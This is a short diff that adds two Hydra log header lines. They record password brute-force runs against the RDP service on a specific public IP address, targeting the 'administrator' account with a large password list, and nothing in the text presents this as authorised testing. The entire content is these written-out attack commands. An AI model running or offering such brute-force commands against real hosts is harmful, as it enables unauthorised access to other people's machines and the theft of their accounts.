@@ -1,0 +1,2 @@
+# Hydra v9.2 run at 2026-07-30 03:00:39 on 139.129.193.165 rdp (hydra -l administrator -P /tmp/big_combined.txt -t 1 -o /tmp/hydra_rdp_139.129.193.165.txt -f 139.129.193.165 rdp)
+# Hydra v9.2 run at 2026-07-30 03:01:59 on 139.129.193.165 rdp (hydra -l administrator -P /tmp/big_combined.txt -t 1 -I -w 5 -o /tmp/hydra_rdp_139.129.193.165.txt -f 139.129.193.165 rdp)
